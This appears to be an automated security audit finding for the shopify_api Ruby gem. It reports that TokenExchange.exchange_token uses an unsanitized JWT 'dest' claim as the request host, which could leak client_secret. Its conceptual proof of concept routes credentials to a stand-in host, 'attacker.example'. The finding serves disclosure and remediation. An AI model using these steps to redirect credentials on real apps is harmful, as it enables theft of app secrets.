Found a concrete analog: `TokenExchange.exchange_token` builds the outbound request host (and therefore the destination that receives the app's `client_id`/`client_secret`) from the JWT `dest` claim without ever passing it through `Utils::ShopValidator.sanitize!`.

### Title
Unsanitized `dest` claim from session token used as request host for token exchange, leaking `client_secret` to attacker-chosen host - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` decodes the caller-supplied session token via `JwtPayload.new(session_token)` and takes `jwt_payload.shop` (derived straight from the JWT's `dest` claim) as the destination shop for the subsequent OAuth token-exchange POST request, which carries the app's `client_id` and `client_secret`. Unlike every other credential-issuing flow in the gem (`RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`, `ClientCredentials.client_credentials`), this path never calls `Utils::ShopValidator.sanitize!` on the shop value before using it to build the request's target host.

### Finding Description
`JwtPayload#shop` simply strips the scheme from the raw `dest` claim: `@dest.gsub("https://", "")` [1](#0-0) . The only checks performed on the token in `JwtPayload#initialize` are signature verification against `Context.api_secret_key`/`old_api_secret_key` and `aud == Context.api_key` [2](#0-1) . There is no validation that `dest` is a trusted `*.myshopify.com`/`myshopify.io`/etc. domain, and no cross-check between `iss` and `dest`.

`exchange_token` then uses this unsanitized value directly to construct the session used for the HTTP request: [3](#0-2) 

Compare this to the two sibling flows in the same file and in `refresh_token.rb`, which explicitly sanitize the shop before using it as a request host: [4](#0-3) [5](#0-4) 

`Clients::HttpClient` builds the outbound URL from `session.shop` with no additional host allow-listing at that layer (the domain trust check lives solely in `ShopValidator`), so whatever string comes out of `jwt_payload.shop` becomes the host that receives `client_id`/`client_secret` in the POST body.

The broken binding, expressed as an equality that should hold but doesn't:
`host validated by ShopValidator.sanitize!` ≠ `host that receives client_id/client_secret in exchange_token`.

### Impact Explanation
Because a signed session token with an attacker-controlled `dest` value is sufficient to redirect the outbound `access_token` request (containing the app's `client_id` and `client_secret`) to an arbitrary host, this is an SSRF that carries the app's credentials to a host of the caller's choosing, and directly matches the Critical/High impact classes in scope (SSRF with the app's credentials, and potential `client_secret` theft/leak). The severity hinges entirely on how an attacker can obtain or influence a validly-signed session token whose `dest` is attacker-controlled — this requires either a token signed by Shopify with a domain not restricted to `*.myshopify.com`-style hosts, or a token forged/replayed by a party who already possesses (or can obtain) a validly signed JWT for a shop but can otherwise influence the `dest` string content (e.g., trailing/embedded characters, `unified admin` style `admin.<host>/store/<shop>` paths that `ShopValidator` specifically has extra logic to normalize but `JwtPayload#shop` does not apply at all).

### Likelihood Explanation
Likelihood is moderate to low without further evidence that Shopify's own session-token issuance always constrains `dest` to a safe value that would still be safe if concatenated into a request host by *this* gem — the gem-side omission is a real code defect (an obvious asymmetry when every other analogous method in the same file calls `ShopValidator.sanitize!` but this one does not), but exploitation depends on obtaining a legitimately signed JWT whose `dest` is not a plain `*.myshopify.com` host, which is not fully provable from library code alone.

### Recommendation
Call `Utils::ShopValidator.sanitize!(jwt_payload.shop)` (or an equivalent dedicated validation of the `dest` claim) in `TokenExchange.exchange_token` before constructing `shop_session`, exactly as is already done in `migrate_to_expiring_token` and `RefreshToken.refresh_access_token`, so the host that receives the `client_secret` is always constrained to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
Conceptual (cannot be fully executed without a way to obtain/forge a session token accepted by `JwtPayload`, which requires the app's `api_secret_key`):
1. Obtain or induce issuance of a session token whose `dest` claim is set to `https://attacker.example` (or a value that normalizes to an attacker-controlled host once concatenated by `Clients::HttpClient`), signed with the app's secret.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: forged_token, requested_token_type: ...)`.
3. `jwt_payload.shop` yields `attacker.example`; `shop_session = Session.new(shop: "attacker.example")`; `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` posts `{client_id, client_secret, subject_token: forged_token, ...}` to `https://attacker.example/admin/oauth/access_token`, leaking the app's `client_secret` and the raw session token to the attacker's server — contrasted with `migrate_to_expiring_token`/`refresh_access_token`, which would reject a non-`myshopify` shop via `ShopValidator.sanitize!` raising `Errors::InvalidShopError` [6](#0-5) .
